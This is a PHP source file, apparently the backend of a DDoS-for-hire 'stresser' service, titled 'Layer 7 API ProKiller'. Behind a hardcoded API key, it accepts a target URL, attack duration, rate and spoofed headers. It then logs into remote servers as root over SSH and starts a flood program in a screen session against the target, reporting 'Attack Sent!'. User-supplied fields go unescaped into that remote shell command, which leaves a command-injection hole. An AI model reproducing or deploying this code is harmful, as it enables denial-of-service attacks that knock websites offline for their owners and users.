<?php

    // Layer 7 API ProKiller

    // Json App Header
    header("Content-Type: application/json");

    error_reporting(E_ALL);
    ini_set('display_errors', 'Off');
    $startreturn = '';

    $GET = filter_input_array(INPUT_GET, FILTER_SANITIZE_STRING);

    // Include phpseclib
    include('libs/phpseclib/Net/SSH2.php');

    // Check API
    $api = $GET['api'];
    if($api != 'drkgmkerpgmkw-ef03409jsdfnmdi') {
        $message = array(
            "status" => 'false',
            "message" => 'Invalid API Key'
        );

        // Encode
        $print = json_encode($message);
        // Print
        print_r($print);
        die();
    }

    $stopper = (int) @$GET['stopper'];
    $stop = (int) @$GET['stop'];

    if($stop == 1) {
        // stop = STOP
        $command = "screen -X -S {$stopper} quit";
    } else if($stop == 0) {
        // Define
        $Target = @$GET['Target'];
        $Time = (int) @$GET['Time'];
        $AttackMethod = @$GET['Method'];
        $ReqMethod = @$GET['ReqMethod'];
        $Rate = @$GET['Rate'];
        $PreCheck = @$GET['PreCheck'];
        $statusCode = @$GET['statusCode'];
        $HData = @$GET['HData'];
        $Referrer = @$GET['Referrer'];
        $Host = @$GET['Host'];
        $Origin = @$GET['Origin'];
        $Mode = @$GET['Mode'];

        // Check for empty
        if(empty($Target)) {
            if(empty($message)) {
                $message = array(
                    "status" => 'false',
                    "message" => 'Target is empty.'
                );
            }
        }

        if(empty($Time)) {
            if(empty($message)) {
                $message = array(
                    "status" => 'false',
                    "message" => 'Time is empty.'
                );
            }
        }

        if(empty($AttackMethod)) {
            if(empty($message)) {
                $message = array(
                    "status" => 'false',
                    "message" => 'Attack Method is empty.'
                );
            }
        }

        $Target = urldecode($Target);

        // Is valid Target
        if(!filter_var($Target, FILTER_VALIDATE_URL)) {
            if(empty($message)) {
                $message = array(
                    "status" => 'false',
                    "message" => 'Invalid Target.'
                );
            }
        }

        $HData = urldecode($HData);
        $Referrer = urldecode($Referrer);
        $Host = urldecode($Host);

        // Check Methods
        if($AttackMethod == "Method") { $command = "screen -dmS {$stopper} ./Method \"{$Target}\" {$Time} {$ReqMethod} {$Rate} {$PreCheck} {$statusCode} \"{$HData}\" \"{$Referrer}\" \"{$Host}\" {$Origin}.txt $Mode"; }

        else {
            if(empty($message)) {
                $message = array(
                    "status" => 'false',
                    "message" => 'Invalid Method. '.$AttackMethod
                );
            }
        }
    }

    // VPS Login Function
    $SERVERS = array(
        "1.1.1.1"       =>      array("root", "1312"),
    );

    if(empty($message)) {
        // Start Function
        foreach ($SERVERS as $server => $credentials) {
            $ssh = new Net_SSH2($server);
            if ($ssh->login($credentials[0], $credentials[1]) == true) {
                // echo $ssh->exec($command);
                $ssh->exec($command);
                $startreturn = true;
            } else {
                $startreturn = false;
                break;
            }
        }
    }

    if($startreturn == false) {
        foreach ($SERVERS as $server => $credentials) {
            $ssh = new Net_SSH2($server);
            if ($ssh->login($credentials[0], $credentials[1]) == true) {
                $ssh->exec("screen -X -s {$stopper} quit");
            }
        }
    }

    if($startreturn == true) {
        if($stop == 1) {
            $message = array(
                "status" => 'true',
                "message" => 'Attack Stopped!'
            );
        } else {
            $message = array(
                "status" => 'true',
                "message" => 'Attack Sent!'
            );
        }
    } else {
        if(empty($message)) {
            $message = array(
                "status" => 'false',
                "message" => 'Servers are down. Please contact support!'
            );
        }
    }

    // Encode
    $print = json_encode($message);
    // Print
    print_r($print);
    die();

?>